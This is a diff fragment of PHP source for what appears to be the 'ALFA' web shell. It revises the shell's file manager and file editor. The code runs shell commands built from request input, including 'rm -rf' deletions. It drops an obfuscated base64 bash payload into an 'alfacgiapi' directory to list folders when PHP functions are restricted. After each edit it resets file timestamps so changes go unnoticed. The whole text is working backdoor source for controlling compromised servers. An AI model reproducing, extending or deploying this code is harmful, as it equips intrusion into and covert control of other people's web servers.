+	echo json_encode($ret_files);
+}
+}else{
+	echo "noperm";
+	return;
+}
+if(!$move_cmd_file){
+return;
 }
 break;
 case 'mkdir':
 $new_dir_cmd = false;
-if(isset($GLOBALS['glob_chdir_false'])){
+if($GLOBALS['glob_chdir_false']){
 	if(_alfa_can_runCommand(true,true)){
-		alfaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
+		if(_alfa_is_writable($GLOBALS['cwd'])){
+			if(!_alfa_is_dir(trim($_POST['alfa2']))){
+				alfaEx("cd '".trim(addslashes($_POST['c']))."';mkdir '".trim(addslashes($_POST['alfa2']))."'");
+				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
+			}else{
+				echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
+			}
+		}else{
+			echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
+		}
+	}else{
+		echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
 	}
 }else{
-if(!@mkdir(trim($_POST['alfa2'])))
-echo "<b><font color='red'>Can't create new dir !</b></font>";
+	if(_alfa_is_writable($GLOBALS['cwd'])){
+		if(!_alfa_is_dir(trim($_POST['alfa2']))){
+			if(!@mkdir(trim($_POST['alfa2']))){
+				echo "<script>alfaShowNotification('Can\'t create new dir !', 'Files manager', 'error');</script>";
+			}else{
+				echo "<script>alfaShowNotification('".addslashes($_POST['alfa2'])." created...', 'Files manager');</script>";
+			}
+		}else{
+			echo "<script>alfaShowNotification('folder already existed', 'Files manager', 'error');</script>";
+		}
+	}else{
+		echo "<script>alfaShowNotification('folder isnt writable !', 'Files manager', 'error');</script>";
+	}
 }
 break;
 case 'delete':
@@ -3076,7 +2669,7 @@ foreach($_POST['f'] as $f){
 if($f == '..')
 continue;
 $f = rawurldecode($f);
-if(isset($GLOBALS["glob_chdir_false"])){
+if($GLOBALS["glob_chdir_false"]){
 	if(_alfa_can_runCommand(true,true)){
 		alfaEx("rm -rf '".addslashes($_POST['c'].'/'.$f)."'");
 	}
@@ -3094,7 +2687,7 @@ alfaEx("rm -rf '".addslashes($_POST['alfa2'])."'",false,false);
 }else{
 @unlink(rawurldecode(@$_POST['alfa2']));
 }
-if(isset($GLOBALS["glob_chdir_false"])){
+if($GLOBALS["glob_chdir_false"]){
 	$source = rawurldecode(@$_POST['alfa2']);
 	if($source!='..'&&!empty($source)){
 		if(_alfa_can_runCommand(true,true)){
@@ -3102,22 +2695,14 @@ if(isset($GLOBALS["glob_chdir_false"])){
 		}
 	}
 }
+if(is_array($_POST['f']))
+return;
 break;
 case 'paste':
-if($_SESSION['act'] == 'copy'&&isset($_SESSION['f'])){
-function copy_paste($c,$s,$d){
-if(@is_dir($c.$s)){
-@mkdir($d.$s);
-$h = @opendir($c.$s);
-while (($f = @readdir($h)) !== false)
-if (($f != ".") and ($f != ".."))
-copy_paste($c.$s.'/',$f, $d.$s.'/');
-} elseif(is_file($c.$s))
-@copy($c.$s, $d.$s);
-}
-foreach($_SESSION['f'] as $f)
-copy_paste($_SESSION['c'],$f, $GLOBALS['cwd']);
-}elseif($_SESSION['act'] == 'move'&&isset($_SESSION['f'])){
+if($_COOKIE['alfa_act'] == 'copy'&&isset($_COOKIE['alfa_f'])){
+foreach($_COOKIE['alfa_f'] as $f)
+copy_paste($_COOKIE['alfa_c'],$f, $GLOBALS['cwd']);
+}elseif($_COOKIE['alfa_act'] == 'move'&&isset($_COOKIE['alfa_f'])){
 function move_paste($c,$s,$d){
 if(@is_dir($c.$s)){
 @mkdir($d.$s);
@@ -3128,19 +2713,19 @@ copy_paste($c.$s.'/',$f, $d.$s.'/');
 }elseif(@is_file($c.$s))
 @copy($c.$s, $d.$s);
 }
-foreach($_SESSION['f'] as $f)
-@rename($_SESSION['c'].$f, $GLOBALS['cwd'].$f);
-}elseif($_SESSION['act'] == 'zip'&&isset($_SESSION['f'])){
+foreach($_COOKIE['alfa_f'] as $f)
+@rename($_COOKIE['alfa_c'].$f, $GLOBALS['cwd'].$f);
+}elseif($_COOKIE['alfa_act'] == 'zip'&&isset($_COOKIE['alfa_f'])){
 if(class_exists('ZipArchive')){
 $zip = new ZipArchive();
 $zipX = "alfa_".rand(1,1000).".zip";
 if($zip->open($zipX, 1)){
-@chdir($_SESSION['c']);
-foreach($_SESSION['f'] as $f){
+@chdir($_COOKIE['alfa_c']);
+foreach($_COOKIE['alfa_f'] as $f){
 if($f == '..')continue;
-if(@is_file($_SESSION['c'].$f))
-$zip->addFile($_SESSION['c'].$f, $f);
-elseif(@is_dir($_SESSION['c'].$f)){
+if(@is_file($_COOKIE['alfa_c'].$f))
+$zip->addFile($_COOKIE['alfa_c'].$f, $f);
+elseif(@is_dir($_COOKIE['alfa_c'].$f)){
 $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/'));
 foreach($iterator as $key=>$value){
 $key = str_replace('\\','/',realpath($key));
@@ -3150,45 +2735,45 @@ if(in_array(substr($key, strrpos($key,'/')+1),array('.', '..')))continue;
 @chdir($GLOBALS['cwd']);
 $zip->close();
 __alert('>> '.$zipX.' << is created...');}}
-}elseif($_SESSION['act'] == 'unzip'&&isset($_SESSION['f'])){
+}elseif($_COOKIE['alfa_act'] == 'unzip'&&isset($_COOKIE['alfa_f'])){
 if(class_exists('ZipArchive')){
 $zip = new ZipArchive();
-foreach($_SESSION['f'] as $f) {
-if($zip->open($_SESSION['c'].$f)){
-$zip->extractTo($GLOBALS['cwd']);
+foreach($_COOKIE['alfa_f'] as $f) {
+if($zip->open($_COOKIE['alfa_c'].$f)){
+$zip->extractTo($_COOKIE['alfa_cwd']);
 $zip->close();}}}}
-unset($_SESSION['f']);
+unset($_COOKIE['alfa_f']);
 break;
 default:
 if(!empty($_POST['alfa1'])){
-$_SESSION['act'] = @$_POST['alfa1'];
-$_SESSION['f'] = @$_POST['f'];
-$_SESSION['c'] = @$_POST['c'];
+if(in_array($_POST['alfa1'], array("copy", "move", "zip", "unzip"))){
+__alfa_set_cookie('alfa_act', @$_POST['alfa1']);
+__alfa_set_cookie('alfa_f', @serialize($_POST['f']));
+__alfa_set_cookie('alfa_c', @$_POST['c']);
+return;
+}
 }
 break;
 }
 }
-if(isset($_SESSION[__LAST_CWD__]) && !isset($_POST['c']) && $_SESSION[__LAST_CWD__] != ''){
-	$dirContent = @scandir($_SESSION[__LAST_CWD__]);
-}else{
-	$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
-	if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
-		$path = explode('/', $res[1]);
-		array_pop($path);
-		$_POST['c'] = implode('/', $path);
-	}
-	$_SESSION[__LAST_CWD__] = str_replace(array("..","//"), array("","/"), $_POST['c']);
+$dirContent = @scandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
+if(preg_match("#(.*)\/\.\.#", $_POST['c'], $res)){
+	$path = explode('/', $res[1]);
+	array_pop($path);
+	$_POST['c'] = implode('/', $path);
 }
 $cmd_dir = false;
 if($dirContent === false){
 	if(_alfa_can_runCommand(true,true)){
+		$tmp_getdir_path = @$_COOKIE["alfachdir_bash_path"];
 		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
-		if(!isset($_SESSION["alfachdir_bash"])||@!file_exists("alfacgiapi/getdir.alfa")){
-			$bash = "jZNvb5swEMZfw6e4eaZppaIk3Z9INLyYNHXq2017UYWocsEEa2AjQ5SxNN99PmMIlTJpEVLOv+fu8Rkf79/N942evwg5bwr/6+P3mC79x4cfMZ0lcubztFBANsTPlQYBQgK9LhsIGYThTqt9HWZC87RVWvAmzIVuWqDG5eYeMuWD+dWsLWKCbE4F8T0hcxXT66ZlLYQpkOAhCn5GwbcoaKLgKVoELAq+EKBYd+N72MosmoHmLINQ485Ma9bBer0GQtHNmLZdzWN6tMpmsT3ZndVBcj3SpaO265HeGeo14s+5+gOSSmUi70b20dXWXFdyX43804QX+4rJUfmMLiKHzcacpK+COAayWK5WKwLb7T20BZe+5w2eZIGKA70ZyfTht30Mz8VgGB7MwfH1oA9cXVmmJ+yNd6pKpWNSMSGfd5pz+YzUGPLS2f1X6aEQLT+XNvxCjubZkHHuluLd2LMPk9K92cheHWqTls41mu/2JdOQi5Lb476+Xk7gVd12/05ruupFlSKFUshfF/a3hX3bduSPCZGs4gmJIDFTlpBb84+pjvQhQjtljroYsR0zh12MGEfN0T5E2E+bw8MCBTcbThlXg2SnZCK69SDbq5nIbn269TMlufu0j6ct+Qs=";
-			alfaWriteTocgiapi("getdir.alfa",$bash);
+		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/alfacgiapi/getdir.alfa")){
+			$bash = "jZTfb5swEMef4a+4uaYkSmmS/YpEwsOkqVNfO+1hSqKKggnWwI4MEaFppL3vv9xfUtsYSKpMWh6I7/O9O9vcHVfvxrtCjJ8oGxep/fX+IcBT+/7ue4DdFXNtEqUc0BLZCRdAgTLAg6wALwQsfYdziLkN8rcNyzRAio0xRRrRBJZLwBSCANDtLYLra/D2Mr5KaZSCIGGcUfZrCOv1HMqUMB3VJcOD1gO8BLBiw86DBhpoO6G2RVnCZURRhiV4ESDnznd++M433yl856c/cULf+YLaLJa6n+u7+gzgCXWdUIiwhsViAQirbMi2ynpLAnzQynKyPurdeMWI6OjU0I3gu21H30tqFfS5j/6gSM5jmtQd+2hit0TkbJd3/NMJT3d5yDrls1EYqR571XWb1yALNBgApcFkLp8LfLjqfI6KjEYw7Av2JstIFu/QWT6m1J8e//7+05Qy5oy8PdNZuKxAU21zGV3zyXQ2m6G+vJbVXhVNlGJAkw/FQm5X7eVDVPKxF5V00LXVmb1KFkaVTyVUraSYOGFnm0Q84yJAeUjZ40YQwvRRZUKSmXT/FSo7tSR9aEEu+AgStx79abHqHf0SYipIVHJRn22kW0tpJ0fqYwTZ7LJQyM7OiL7uy8tlB5Jvy/rfbkWdP/GMRqCm6ML+OrA5tp7zwwqxMCcr5MNKTsEK3ch/5WpIs1RQT4GhZq2wHgODzVphNQqGNksFm2kwuDWUYJrEKJ3VSrpdTkRjt7IuzYls7OONrZu4+Z4djmv0Cg==";
+			$tmp_getdir_path = alfaWriteTocgiapi("getdir.alfa",$bash);
+			__alfa_set_cookie("alfachdir_bash", "true");
+			__alfa_set_cookie("alfachdir_bash_path", $tmp_getdir_path);
 		}
-		if(empty($_SESSION[__LAST_CWD__]))$_SESSION[__LAST_CWD__] = "/";
-		$dirContent = alfaEx("cd alfacgiapi;sh getdir.alfa '".addslashes($_SESSION[__LAST_CWD__])."'");
+		$dirContent = alfaEx("cd ".$tmp_getdir_path."/alfacgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
 		$dirContent = json_decode($dirContent, true);
 		if(is_array($dirContent)){
 			array_pop($dirContent);
@@ -3196,9 +2781,26 @@ if($dirContent === false){
 		}else{
 			$dirContent = false;
 		}
-		$_SESSION["alfachdir_bash"] = true;
 	}
 }
+alfahead();
+AlfaNum(8,9,10,7,6,5,4);
+$count_dirContent = @count($dirContent);
+if($count_dirContent > 300){
+	@$_COOKIE["alfa_limited_files"] = 100;
+}
+$alfa_sort_by = isset($_COOKIE["alfa_sort_by"]) ? $_COOKIE["alfa_sort_by"] : 'name';
+$alfa_limited_files = isset($_COOKIE["alfa_limited_files"]) ? (int)$_COOKIE["alfa_limited_files"] : 0;
+$alfa_files_page_number = isset($_POST["pagenum"]) ? (int)$_POST["pagenum"] : 1;
+$alfa_filesman_direction = isset($_COOKIE["alfa_filesman_direction"]) ? $_COOKIE["alfa_filesman_direction"] : 'asc';
+$files_page_count = 1;
+if($alfa_limited_files > 0){
+	$files_page_count = ceil($count_dirContent/$alfa_limited_files);
+	if($files_page_count > 1){
+		$files_page_count++;
+	}
+}
+echo '<div><div class="filters-holder"><span>Filter: </span><input style="color:#25ff00;" autocomplete="off" type="text" id="regex-filter" name="name-filter" onkeydown="doFilterName(this);"><span style="margin-left:10px">Sort By: </span><select name="sort_files" onchange="sortBySelectedValue(this,\'alfa_sort_by\');" style="color:#25ff00;"><option value="name" '.($alfa_sort_by == 'name'?'selected':'').'>Name</option><option value="size" '.($alfa_sort_by == 'size'?'selected':'').'>Size</option><option value="modify" '.($alfa_sort_by == 'modify'?'selected':'').'>Modify</option></select><span style="margin-left:10px">Direction: </span><select name="direction_filesman" onChange="sortBySelectedValue(this,\'alfa_filesman_direction\')" style="color:#25ff00;"><option value="asc" '.($alfa_filesman_direction == 'asc'?'selected':'').'>Ascending</option><option value="desc" '.($alfa_filesman_direction == 'desc'?'selected':'').'>Descending</option></select><span style="margin-left:10px;"> limit: </span><input style="text-align:center;width: 40px;color:#25ff00;" type="text" name="limited_number" value="'.$alfa_limited_files.'" oninput="this.value=this.value.replace(/[^0-9]/g,\'\');setCookie(\'alfa_limited_files\', this.value, 2012);"><span style="margin-left:10px;">Files Count: <b style="color:#25ff00;">'.($count_dirContent-1).'</b></span></div><div class="header">';
 if($dirContent == false){
 echo '<center><br><span style="font-size:16px;"><span style="color: red; -webkit-text-shadow: 1px 1px 13px;"><strong><b><big>!!! Access Denied !!!</b></big><br><br></strong></div>';
 alfaFooter();
@@ -3206,14 +2808,33 @@ return;
 }
 global $sort;
 $sort = array('name', 1);
+if(isset($_COOKIE["alfa_sort_by"]) && !empty($_COOKIE["alfa_sort_by"])){
+	$sort[0] = $_COOKIE["alfa_sort_by"];
+}
 if(!empty($_POST['alfa1'])) {
 if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['alfa1'], $match))
 $sort = array($match[1], (int)$match[2]);
 }
-echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk' onclick='checkBox();' class='chkbx'><label for='mchk'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
+if($alfa_files_page_number > ($files_page_count-1)){
+	$alfa_files_page_number = 1;
+}
+$checkbox_rand = rand(11111, 99999);
+echo "<form onsubmit='fc(this);return false;' name='files' method='post'><table id='filemanager_table' width='100%' class='main' cellspacing='0' cellpadding='2'><tr><th width='13px'><div class='myCheckbox' style='padding-left:0px;'><input type='checkbox' id='mchk".$checkbox_rand."' onclick='checkBox(this);' class='chkbx'><label for='mchk".$checkbox_rand."'></label></div></th><th>Name</th><th>Size</th><th>Modify</th><th>Owner/Group</th><th>Permissions</th><th>Actions</th></tr>";
 $dirs = $files = array();
-$n = count($dirContent);
-for($i=0;$i<$n;$i++){
+$n = $count_dirContent;
+if($n > $alfa_limited_files && $alfa_limited_files > 0){
+	$n = ($alfa_limited_files * $alfa_files_page_number);
+	if($n > $count_dirContent){
+		$n = $count_dirContent;
+	}
+}
+$i = 0;
+if($alfa_limited_files > 0 && $alfa_files_page_number > 1){
+	$i = $alfa_limited_files * ($alfa_files_page_number - 1);
+}
+$page_builder = get_pagination_links($alfa_files_page_number,$files_page_count -1);
+$cmd_dir_backp = "";
+for(;$i<$n;$i++){
 if($cmd_dir){
 $filename = $dirContent[$i]["name"];
 $file_owner = $dirContent[$i]["owner"];
@@ -3221,7 +2842,13 @@ $file_group = $dirContent[$i]["group"];
 $file_modify = @date('Y-m-d H:i:s', $dirContent[$i]["modify"]);
 $file_perm = alfaPermsColor(array("class"=>$dirContent[$i]["permcolor"],"num"=>$dirContent[$i]["permnum"],"human"=>$dirContent[$i]["permhuman"]),true);
 $file_size = $dirContent[$i]["size"];
-$file_path = $_SESSION[__LAST_CWD__]."/".$dirContent[$i]["name"];
+if(substr($dirContent[$i]["name"], 0 ,1) == "/"){
+$file_path = $dirContent[$i]["name"];
+$dirContent[$i]["name"] = "..";
+$filename = $dirContent[$i]["name"];
+}else{
+$file_path = $GLOBALS['cwd']."/".$dirContent[$i]["name"];
+}
 }else{
 $filename = $dirContent[$i];
 $ow = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($GLOBALS['cwd'].$filename)):array("name" => "????");
@@ -3241,13 +2868,21 @@ $tmp = array('name' => $filename,
 'owner' => $file_owner,
 'group' => $file_group
 );
+if($filename == ".." && !$cmd_dir){
+	$tmp["path"] = str_replace("\\", "/", realpath($file_path));
+}
 if(!$cmd_dir){
-if(@is_file($file_path))
-$files[] = array_merge($tmp, array('type' => 'file'));
-elseif(@is_link($file_path))
+if(@is_file($file_path)){
+$arr_mrg = array('type' => 'file');
+if(@is_link($file_path)){
+$arr_mrg["link"] = readlink($tmp['path']);
+}
+$files[] = array_merge($tmp, $arr_mrg);
+}elseif(@is_link($file_path)){
 $dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
-elseif(@is_dir($file_path)&& ($filename != "."))
+}elseif(@is_dir($file_path)&& ($filename != ".")){
 $dirs[] = array_merge($tmp, array('type' => 'dir'));
+}
 }else{
 	if($dirContent[$i]["type"]=="file"){
 		$files[] = array_merge($tmp, array('type' => 'file'));
@@ -3267,33 +2902,70 @@ return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
 }
 usort($files, "alfaCmp");
 usort($dirs, "alfaCmp");
+if(isset($_COOKIE["alfa_filesman_direction"])&& !empty($_COOKIE["alfa_filesman_direction"])){
+	if($_COOKIE["alfa_filesman_direction"] == 'desc'){
+		$files = array_reverse($files);
+		$dirs = array_reverse($dirs);
+	}
+}
 $files = array_merge($dirs, $files);
 $l=0;
 $cc=0;
 foreach($files as $f){
 $f['name'] = htmlspecialchars($f['name']);
 $newname = mb_strlen($f['name'], 'UTF-8')>60?mb_substr($f['name'], 0, 60, 'utf-8').'...':$f['name'];
-$checkbox = 'checkbox'.$cc;
+$checkbox = 'checkbox_'.$checkbox_rand.$cc;
 $raw_name = rawurlencode($f['name']);
 $icon = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($f['name'],$f['type']).'" width="30" height="30">':'';
 $style = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
-echo '<tr'.($l?' class=l1':'').'><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td>'.$icon.'<div style="'.$style.'"><a class="main_name" href=javascript:void(0) onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');">'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" title=' . $f['link'] . '><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?alfaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
-$f['perms'].'</td><td><a class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
+echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').alfaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
+$f['perms'].'</td><td><a id="id_rename_'.$cc.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a id="id_touch_'.$cc.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a id="id_edit_'.$cc.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a id="id_download_'.$cc.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$cc.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
 $l = $l?0:1;
 $cc++;
 }
-echo "<tr><td colspan=7>
+echo "<tr id='filemanager_last_tr'><td colspan=7>
 <input type=hidden name=a value='FilesMan'>
-<input type=hidden name=c value='".htmlspecialchars((isset($GLOBALS['glob_chdir_false'])?$_POST['c']:$GLOBALS['cwd']))."'>
+<input type=hidden name=c value='".htmlspecialchars(($GLOBALS['glob_chdir_false']?$_POST['c']:$GLOBALS['cwd']))."'>
 <input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
 <select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
 <input type='submit' value=' '>
-</form></table></div></div>";
+</form></table><div class='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
 alfafooter();
+}
+function get_pagination_links($current_page, $total_pages){
+    $links = "";
+    if ($total_pages >= 1 && $current_page <= $total_pages) {
+		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
+		$selected_page = "";
+		if($current_page == 1){
+			$selected_page = " active-page-number";
+		}
+        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";
+        $i = max(2, $current_page - 5);
+        if ($i > 2)
+            $links .= "<a class=\"page-number\">...</a>";
+        for (; $i < min($current_page + 6, $total_pages); $i++) {
+			if($i == $current_page){
+				$selected_page = " active-page-number";
+			}else{
+				$selected_page = "";
+			}
+            $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$i}</a>";
+        }
+        if ($i != $total_pages)
+            $links .= "<a class=\"page-number\">...</a>";
+		$selected_page = " last-page-number";
+		if($current_page == $total_pages){
+			$selected_page .= " active-page-number";
+		}
+        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$total_pages}</a>";
+		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
+    }
+    return $links;
 }
 function alfaFilesTools(){
 alfahead();
-echo '<div class="filestools">';
+echo '<div class="filestools" style="height: 100%;">';
 if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
 $alfa1_decoded = $_POST['alfa1'];
 $chdir_fals = false;
@@ -3369,22 +3041,50 @@ if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
 	}
 }
 }
-echo '<span class="editor_file_info_vars">Name:</span> '.htmlspecialchars($alfa1_decoded).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']).'<br><br>';
+if(substr($_POST['alfa1'], 0, 7) == "phar://"){
+	$alfa_file_directory = $_POST['alfa1'];
+}else{
+	$alfa_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']);
+}
+echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($alfa1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($alfa_file_directory).'</div>';
 if(empty($_POST['alfa2']))$_POST['alfa2'] = 'view';
 if(!_alfa_is_dir($_POST['alfa1'])){
-$m = array('View', 'Edit', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
+$m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
 $ftype = "file";
 }else{
 $m = array('Chmod', 'Rename', 'Touch');
 $ftype = "dir";
 }
+echo('<div>');
 foreach($m as $v)
 echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
-echo '<br><br>';
+echo '</div>';
 switch($_POST['alfa2']){
-case 'view':
+case 'view':case 'edit':
 @chdir($_POST['c']);
-echo '<div class="editor-view"><div class="view-content"><p><button style="border-radius:10px;" class="button" onClick="copyToClipboard(\'view_ml_content\');">copy to clipboard</button></p><pre class="ml1" id="view_ml_content">';
+$disabled_btn = "";
+if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
+$disabled_btn = "disabled=disabled";
+$disabled_btn_style= 'background: #ff0000;color: #fff;';
+}
+if(!empty($_POST['alfa3'])){
+$_POST['alfa3'] = substr($_POST['alfa3'],1);
+$time = @filemtime($_POST['alfa1']);
+$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
+if($chdir_fals&&$alfa_canruncmd){
+	$rname = $alfa1_decoded;
+	$randname = $rname.rand(111,9999);
+	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
+	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
+		alfaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
+	}
+}
+if($fp){
+echo 'Saved!<br>';
+@touch($_POST['alfa1'],$time,$time);
+}
+}
